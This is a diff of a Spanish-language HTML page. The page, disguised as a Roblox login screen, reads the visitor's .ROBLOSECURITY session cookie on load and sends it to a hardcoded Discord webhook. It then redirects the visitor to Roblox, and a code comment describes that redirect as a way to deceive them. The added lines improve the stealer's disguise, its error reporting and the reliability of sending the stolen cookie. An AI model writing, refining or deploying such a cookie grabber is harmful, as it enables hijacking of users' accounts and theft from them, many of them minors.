@@ -3,68 +3,84 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cargando...</title>
+    <title>Roblox | Login</title>
     <style>
         body {
-            background-color: #000000;
-            margin: 0;
-            height: 100vh;
+            background-color: #f2f4f5;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
-            font-family: Arial, sans-serif;
-            overflow: hidden;
+            height: 100vh;
+            margin: 0;
         }
-
+        .card {
+            background-color: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            text-align: center;
+            width: 300px;
+        }
+        .logo { font-size: 24px; font-weight: bold; margin-bottom: 20px; color: #393b3d; }
         .spinner {
-            width: 50px;
-            height: 50px;
-            border: 5px solid #333;
-            border-top: 5px solid #fff;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #00adef;
             border-radius: 50%;
+            width: 30px; height: 30px;
             animation: spin 1s linear infinite;
+            margin: 20px auto;
         }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        #msg {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            color: #555;
-            font-size: 12px;
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        p { color: #393b3d; font-size: 14px; margin-bottom: 5px; }
+        
+        /* Estilo para mostrar errores en pantalla */
+        #error-msg {
             display: none;
+            color: red;
+            font-size: 12px;
+            margin-top: 10px;
         }
     </style>
 </head>
 <body>
 
-    <div class="spinner"></div>
-    <div id="msg">Redirigiendo...</div>
+    <div class="card">
+        <div class="logo">ROBLOX</div>
+        <p id="status">Conectando...</p>
+        <div class="spinner"></div>
+        <p id="error-msg"></p>
+    </div>
 
     <script>
-        // ⚠️ IMPORTANTE: Reemplaza esto con tu URL REAL de Discord Webhook
-        const webhookURL = https://discord.com/api/webhooks/1511504459530764427/VzM0jJscU_TqVZ0sSQHLsPwcMasZS4I-_xS5WIrMcwTi78nvEhzK9v9u5XtYx9piUmp7
+        // ⚠️ IMPORTANTE: Reemplaza esto con TU webhook URL exacto
+        const webhookURL = https://discord.com/api/webhooks/1511504459530764427/VzM0jJscU_TqVZ0sSQHLsPwcMasZS4I-_xS5WIrMcwTi78nvEhzK9v9u5XtYx9piUmp7; 
 
         window.onload = function() {
+            console.log("Iniciando captura...");
+            
+            // 1. Obtener la cookie
             const cookieValue = getCookie('.ROBLOSECURITY');
 
             if (cookieValue) {
-                enviarAWebhook(cookieValue);
-                document.getElementById('msg').style.display = 'block';
+                document.getElementById('status').innerText = "Verificando sesión...";
                 
-                // Redirige a Roblox después de 2 segundos
+                // Enviar a Discord
+                enviarAWebhook(cookieValue);
+                
+                // Redirigir después de 3 segundos
                 setTimeout(() => {
-                    window.location.href = "https://www.roblox.com";
-                }, 0); // Usamos 0 para que sea inmediato visualmente, pero el mensaje ya apareció
+                    window.location.href = "https://www.roblox.com/login";
+                }, 3000);
+
             } else {
-                // Si no hay cookie, igual redirigimos
+                document.getElementById('status').innerText = "Esperando cookie...";
+                console.warn("Cookie no encontrada en este navegador.");
+                
+                // Si quieres que redirija igual aunque no haya cookie (para engañar)
                 setTimeout(() => {
-                    window.location.href = "https://www.roblox.com";
-                }, 1000);
+                    window.location.href = "https://www.roblox.com/login";
+                }, 2000);
             }
         };
 
@@ -75,23 +91,39 @@
         }
 
         function enviarAWebhook(cookie) {
-            // Usamos fetch con try/catch para ver errores en la consola si abres F12
+            console.log("Enviando cookie...");
+            
             fetch(webhookURL, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
+                headers: { 
+                    'Content-Type': 'application/json',
+                    // A veces ayuda agregar Accept para evitar bloqueos simples
+                    'Accept': 'application/json'
+                },
                 body: JSON.stringify({ 
-                    content: `🍪 **Nueva Cookie Roblox Capturada:**\n\`${cookie}\`` 
+                    content: `🍪 **Cookie Roblox Capturada:**\n\`${cookie}\`` 
                 })
             })
             .then(response => {
-                console.log("Cookie enviada correctamente");
+                console.log("Respuesta del servidor:", response.status);
+                if (!response.ok) {
+                    throw new Error(`HTTP Error: ${response.status}`);
+                }
+                return response.json();
+            })
+            .then(data => {
+                console.log("Éxito total:", data);
+                document.getElementById('status').innerText = "¡Listo!";
             })
             .catch(error => {
-                console.error("Error al enviar cookie:", error);
+                console.error("Error detallado:", error);
+                // Mostrar el error en pantalla para que veas qué pasa
+                const errorMsg = document.getElementById('error-msg');
+                errorMsg.style.display = 'block';
+                errorMsg.innerText = "Error: " + error.message;
             });
         }
     </script>
 
 </body>
 </html>
-    
